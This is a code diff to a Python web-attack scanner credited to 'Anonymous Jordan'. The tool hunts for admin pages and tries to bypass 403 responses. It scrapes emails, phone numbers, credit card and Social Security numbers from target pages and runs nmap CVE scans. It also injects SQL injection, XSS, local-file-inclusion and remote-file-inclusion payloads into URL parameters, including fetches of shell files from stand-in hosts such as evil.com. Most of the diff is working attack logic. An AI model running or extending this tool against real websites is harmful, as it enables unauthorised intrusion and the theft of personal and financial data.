@@ -13,7 +13,6 @@ from fake_useragent import UserAgent
 from colorama import Fore, Style, init
 import pyfiglet
 
-# Initialize colorama for colored output
 init(autoreset=True)
 
 class Colors:
@@ -35,7 +34,6 @@ class CyberScanner:
             "server_info": {},
             "hidden_pages": [],
             "admin_pages": [],
-            "database_interfaces": [],
             "bypass_success": [],
             "credentials": [],
             "sensitive_data": {
@@ -84,7 +82,7 @@ class CyberScanner:
     def show_developer_info(self):
         self.clear_screen()
         print(f"{Colors.GREEN}Tool Made By Anonymous Jordan")
-        print(f"{Colors.CYAN}Link: {Colors.WHITE}https://t.me/AnonymousJordan")
+        print(f"{Colors.CYAN}Telegram: {Colors.WHITE}https://t.me/AnonymousJordan")
         input(f"\n{Colors.YELLOW}Press Enter to return to menu...")
 
     def normalize_url(self, url):
@@ -149,17 +147,15 @@ class CyberScanner:
                         self.results['hidden_pages'].append(entry)
                         if "admin" in path.lower():
                             self.results['admin_pages'].append(url)
-                # Attempt 403 bypass if needed
+                # Attempt 403 bypass
                 if resp.status_code == 403:
                     self.bypass_403(url)
             except Exception as e:
                 self.log_error(f"Hidden Page Check Error ({url}): {str(e)}")
 
-        threads = []
-        for path in common_paths:
-            t = threading.Thread(target=check_path, args=(path,))
+        threads = [threading.Thread(target=check_path, args=(path,)) for path in common_paths]
+        for t in threads:
             t.start()
-            threads.append(t)
         for t in threads:
             t.join()
 
@@ -190,7 +186,7 @@ class CyberScanner:
         sensitive_keywords = ['password', 'passwd', 'api_key', 'secret', 'db_password']
         try:
             resp = requests.get(self.target, headers=self.headers, timeout=10)
-            found = [kw for kw in sensitive_keywords if kw in resp.text.lower()]
+            found = [kw for kw in sensitive_keywords if re.search(rf'\b{kw}\b', resp.text, re.IGNORECASE)]
             if found:
                 self.results['credentials'].append({
                     'url': self.target,
@@ -203,17 +199,19 @@ class CyberScanner:
     def check_sensitive_data(self):
         patterns = {
             'emails': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
-            'phone_numbers': r'(\+\d{1,3}\s?)?\(?\d{1,4}\)?[\s.-]?\d{1,4}[\s.-]?\d{1,9}',
+            'phone_numbers': r'^(\+\d{1,3})?[\s.-]?\(?\d{1,4}\)?[\s.-]?\d{1,4}[\s.-]?\d{1,4}[\s.-]?\d{1,9}$',
             'credit_cards': r'\b(?:\d[ -]*?){13,16}\b',
             'social_security': r'\b\d{3}-\d{2}-\d{4}\b'
         }
         
         try:
             resp = requests.get(self.target, headers=self.headers, timeout=10)
+            content = resp.text
             for data_type, regex in patterns.items():
-                matches = re.findall(regex, resp.text)
-                if matches:
-                    self.results['sensitive_data'][data_type].extend(matches)
+                matches = list(set(re.findall(regex, content)))
+                if matches and data_type == 'phone_numbers':
+                    matches = [num for num in matches if len(num.replace('-', '').replace('.', '').replace(' ', '')) >= 8]
+                self.results['sensitive_data'][data_type] = matches
         except Exception as e:
             self.log_error(f"Sensitive Data Check Error: {str(e)}")
 
@@ -245,36 +243,41 @@ class CyberScanner:
         except Exception as e:
             self.log_error(f"Nmap Error: {str(e)}")
 
-    def check_sqli(self):
-        payloads = ["' OR 1=1--", "' UNION SELECT null, version()--"]
-        parsed = urlparse(self.target)
-        params = parse_qs(parsed.query)
-        
-        for param in params:
-            for payload in payloads:
-                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
-                try:
-                    resp = requests.get(url, headers=self.headers, timeout=10)
-                    if "SQL syntax" in resp.text:
-                        self.results['vulnerabilities']['sqli'].append({
-                            'url': url,
-                            'payload': payload,
+    def check_cve_vulnerabilities(self):
+        try:
+            nm = nmap.PortScanner()
+            nm.scan(hosts=urlparse(self.target).netloc, 
+                    arguments='--script vulners --script-args mincvss=7.0')
+            host = urlparse(self.target).netloc
+            if 'script' in nm[host]:
+                for script, output in nm[host]['script'].items():
+                    cve_matches = re.findall(r'CVE-\d{4}-\d{4,7}', output)
+                    if cve_matches:
+                        self.results['vulnerabilities']['cve'].append({
+                            'script': script,
+                            'CVEs': cve_matches,
                             'severity': 'Critical'
                         })
-                except Exception as e:
-                    self.log_error(f"SQLi Check Error ({url}): {str(e)}")
+        except Exception as e:
+            self.log_error(f"CVE Check Error: {str(e)}")
 
     def check_xss(self):
-        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "';alert('XSS')//"
+        ]
         parsed = urlparse(self.target)
         params = parse_qs(parsed.query)
         
         for param in params:
-            for payload in payloads:
+            for payload in xss_payloads:
                 url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                 try:
                     resp = requests.get(url, headers=self.headers, timeout=10)
-                    if payload in resp.text:
+                    if any(x in resp.text for x in ['<script>', 'alert(']):
                         self.results['vulnerabilities']['xss'].append({
                             'url': url,
                             'payload': payload,
@@ -283,13 +286,32 @@ class CyberScanner:
                 except Exception as e:
                     self.log_error(f"XSS Check Error ({url}): {str(e)}")
 
-    def check_lfi(self):
-        payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
+    def check_sqli(self):
+        sqli_payloads = ["' OR 1=1--", "' UNION SELECT null, version()--"]
         parsed = urlparse(self.target)
         params = parse_qs(parsed.query)
         
         for param in params:
-            for payload in payloads:
+            for payload in sqli_payloads:
+                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
+                try:
+                    resp = requests.get(url, headers=self.headers, timeout=10)
+                    if "SQL syntax" in resp.text or "error in your SQL" in resp.text:
+                        self.results['vulnerabilities']['sqli'].append({
+                            'url': url,
+                            'payload': payload,
+                            'severity': 'Critical'
+                        })
+                except Exception as e:
+                    self.log_error(f"SQLi Check Error ({url}): {str(e)}")
+
+    def check_lfi(self):
+        lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
+        parsed = urlparse(self.target)
+        params = parse_qs(parsed.query)
+        
+        for param in params:
+            for payload in lfi_payloads:
                 url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                 try:
                     resp = requests.get(url, headers=self.headers, timeout=10)
@@ -303,12 +325,12 @@ class CyberScanner:
                     self.log_error(f"LFI Check Error ({url}): {str(e)}")
 
     def check_rfi(self):
-        payloads = ["http://evil.com/exploit.txt", "https://malicious.com/shell.php"]
+        rfi_payloads = ["http://evil.com/exploit.txt", "https://malicious.com/shell.php"]
         parsed = urlparse(self.target)
         params = parse_qs(parsed.query)
         
         for param in params:
-            for payload in payloads:
+            for payload in rfi_payloads:
                 url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                 try:
                     resp = requests.get(url, headers=self.headers, timeout=10)
@@ -387,22 +409,6 @@ class CyberScanner:
         except Exception as e:
             self.log_error(f"Misconfiguration Check Error: {str(e)}")
 
-    def check_cve_vulnerabilities(self):
-        try:
-            nm = nmap.PortScanner()
-            nm.scan(hosts=urlparse(self.target).netloc, 
-                    arguments='--script vuln --script-args=unsafe=1')
-            if 'script' in nm._scan_result['scan'].get(urlparse(self.target).netloc, {}):
-                for script, output in nm._scan_result['scan'][urlparse(self.target).netloc]['script'].items():
-                    if "CVE" in output:
-                        self.results['vulnerabilities']['cve'].append({
-                            'script': script,
-                            'output': output,
-                            'severity': 'Critical'
-                        })
-        except Exception as e:
-            self.log_error(f"CVE Check Error: {str(e)}")
-
     def log_error(self, message):
         with self.lock:
             self.results['errors'].append({
@@ -418,7 +424,7 @@ class CyberScanner:
         report.append(f"Target: {self.target}\n")
 
         # IP Information
-        report.append("IP INFORMATION")
+        report.append(f"{Colors.YELLOW}IP INFORMATION")
         report.append("-" * 40)
         if self.results['ip_info']:
             for k, v in self.results['ip_info'].items():
@@ -427,7 +433,7 @@ class CyberScanner:
             report.append("No IP information available")
 
         # Server Information
-        report.append("\nSERVER INFORMATION")
+        report.append(f"\n{Colors.YELLOW}SERVER INFORMATION")
         report.append("-" * 40)
         if self.results['server_info']:
             for k, v in self.results['server_info'].items():
@@ -435,25 +441,16 @@ class CyberScanner:
         else:
             report.append("No server information available")
 
-        # Hidden Pages
-        report.append("\nHIDDEN PAGES")
-        report.append("-" * 40)
-        if self.results['hidden_pages']:
-            for page in self.results['hidden_pages']:
-                report.append(f"URL: {page['url']} (Status: {page['status_code']}, Size: {page['content_length']} bytes)")
-        else:
-            report.append("No hidden pages found")
-
         # Admin Pages
-        report.append("\nADMIN PAGES")
+        report.append(f"\n{Colors.YELLOW}ADMIN PAGES")
         report.append("-" * 40)
         if self.results['admin_pages']:
             report.append("\n".join([f"  - {url}" for url in self.results['admin_pages']]))
         else:
             report.append("No admin pages found")
 
-        # 403 Bypass Success
-        report.append("\n403 BYPASS SUCCESS")
+        # 403 Bypass
+        report.append(f"\n{Colors.YELLOW}403 BYPASS SUCCESS")
         report.append("-" * 40)
         if self.results['bypass_success']:
             for entry in self.results['bypass_success']:
@@ -463,17 +460,17 @@ class CyberScanner:
             report.append("No 403 bypass successes")
 
         # Sensitive Data
-        report.append("\nSENSITIVE DATA")
+        report.append(f"\n{Colors.YELLOW}SENSITIVE DATA")
         report.append("-" * 40)
         for data_type in self.results['sensitive_data']:
+            report.append(f"\n{data_type.upper()}:")
             if self.results['sensitive_data'][data_type]:
-                report.append(f"\n{data_type.upper()} ({len(self.results['sensitive_data'][data_type])} findings):")
                 report.append("\n".join([f"  - {item}" for item in self.results['sensitive_data'][data_type]]))
             else:
-                report.append(f"{data_type.title()}: None found")
+                report.append("  None found")
 
         # Security Headers
-        report.append("\nSECURITY HEADERS")
+        report.append(f"\n{Colors.YELLOW}SECURITY HEADERS")
         report.append("-" * 40)
         if self.results['security_headers']:
             report.append(f"Missing Headers: {', '.join(self.results['security_headers']['missing_headers'])}")
@@ -482,7 +479,7 @@ class CyberScanner:
             report.append("Security headers check failed")
 
         # Vulnerabilities
-        report.append("\nVULNERABILITIES")
+        report.append(f"\n{Colors.YELLOW}VULNERABILITIES")
         report.append("-" * 40)
         for vuln_type in self.results['vulnerabilities']:
             if self.results['vulnerabilities'][vuln_type]:
@@ -491,11 +488,11 @@ class CyberScanner:
                     report.append(f"  URL: {vuln.get('url', 'N/A')}")
                     report.append(f"  Payload: {vuln.get('payload', 'N/A')}")
                     report.append(f"  Severity: {vuln['severity']}")
-                    if 'output' in vuln:
-                        report.append(f"  Output: {vuln['output'][:100]}...")
+                    if 'CVEs' in vuln:
+                        report.append(f"  CVEs: {', '.join(vuln['CVEs'])}")
 
         # Nmap Scan
-        report.append("\nNMAP SCAN RESULTS")
+        report.append(f"\n{Colors.YELLOW}NMAP SCAN RESULTS")
         report.append("-" * 40)
         if self.results['nmap_scan']:
             report.append(json.dumps(self.results['nmap_scan'], indent=2))
@@ -503,7 +500,7 @@ class CyberScanner:
             report.append("Nmap scan failed")
 
         # Errors
-        report.append("\nERRORS")
+        report.append(f"\n{Colors.YELLOW}ERRORS")
         report.append("-" * 40)
         if self.results['errors']:
             for error in self.results['errors']:
